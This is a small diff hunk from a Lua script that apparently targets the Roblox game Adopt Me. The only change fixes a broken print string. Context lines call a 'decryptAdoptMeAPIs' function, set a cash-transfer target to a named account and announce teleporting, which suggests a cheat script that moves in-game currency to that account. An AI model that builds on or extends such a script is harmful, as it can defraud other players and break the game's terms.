@@ -21,7 +21,7 @@ local function decryptAdoptMeAPIs()
 end
 print("script started")
 decryptAdoptMeAPIs()
-print("wait)
+print("wait")
 task.wait(5)
 cashTransferName = "LanshRBLX"
 print("start to teleport")
